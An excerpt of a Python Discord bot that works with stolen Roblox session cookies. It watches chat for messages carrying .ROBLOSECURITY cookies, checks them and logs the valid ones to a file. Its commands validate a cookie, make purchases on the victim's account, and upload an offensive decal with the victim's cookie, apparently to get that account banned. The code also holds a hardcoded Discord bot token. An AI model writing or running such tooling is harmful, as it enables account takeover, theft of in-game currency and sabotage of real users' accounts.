...
token = "OTk2MDEzNDYzNDMwMjU0NjQz.G9RYuA.S1-lPe8sPD7TOpk2SV5ny8Jwjs7ithTy5DqBGk"
...
async def on_message(message):
    ...
    if message.content.startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
        ...
        if data["status"] == "failed":
            ...
            print(
                f"Found Valid Cookie With Username:{data['username']} And Logged To File."
            )
...
async def bancookie(ctx, cookie=None):
    ...
    if cookie == None:
        await ctx.message.reply(
            "Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!bancookie mycookie'"
    ...
    files = {
        'file': ('lol.png', open("theimage.jpg", 'rb'), 'image/png')
    }  ## add the sussy img
    data = {
    ...
    try:
        response = req1.post('https://www.roblox.com/build/upload',
                             files=files,
                             data=data)  #upload decal teehee
...
async def buystuff(ctx, cookie=None):
    if cookie == None:
        await ctx.message.reply(
            "Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!buystuff mycookie'"
        )  ## let the user know they aint provided cookie
        return  ## break command
    ...
    expectedPrice = int(
        re.search("data-expected-price=\"(\d+)\"", text).group(1))
    expectedSellerId = int(
        re.search("data-expected-seller-id=\"(\d+)\"", text).group(1))

    headers = {"cookie": f".ROBLOSECURITY={cookie}", "x-csrf-token": token}
...
async def check(
    ...
    if cookie == None:
        await ctx.message.reply(
            "Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!checkcookie mycookie'"
        )  ## let the user know they aint provided cookie
        return  ## break command
    ...
    cook = discord.Embed(title=f'**Yum Yum A Valid Cookie, My Favourite**',
                         color=0x42be8f)
